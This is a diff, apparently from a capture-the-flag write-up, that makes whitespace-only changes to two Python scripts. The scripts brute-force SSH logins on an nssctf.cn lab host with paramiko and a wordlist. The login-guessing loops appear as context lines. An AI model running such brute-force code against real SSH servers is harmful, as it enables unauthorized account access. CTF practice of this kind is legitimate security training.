@@ -34,6 +34,7 @@ import hashlib
 host = 'node2.anna.nssctf.cn'
 port = 28914
 
+
 def connect(user, password, i):
     try:
         ssh = paramiko.SSHClient()
@@ -46,9 +47,11 @@ def connect(user, password, i):
         if len(data):
             print(f'[+] found! found at {i}! info: {user} {password} {data}')
 
+
     except:  # 当报错停止时，记录报错位置，再次运行时手动修改for i in range(306, len(userlist)) 中 i 的爆破位置
         print(f'[-] error! stop at {i}! info: {user} {password}')
         exit(0)
+
 
 userlist = open('./wordlist.txt').readlines()
 for i in range(306, len(userlist)):
@@ -69,6 +72,7 @@ import hashlib
 host = 'node2.anna.nssctf.cn'
 port = 28176
 
+
 def connect(user, password, i):
     try:
         ssh = paramiko.SSHClient()
@@ -81,9 +85,11 @@ def connect(user, password, i):
         if len(data) != 7:
             print(f'[+] found! found at {i}! info: {user} {password} {data}')
 
+
     except:
         print(f'[-] error! stop at {i}! info: {user} {password}')
         exit(0)
+
 
 userlist = open('./wordlist.txt').readlines()
 for i in range(83, len(userlist)):
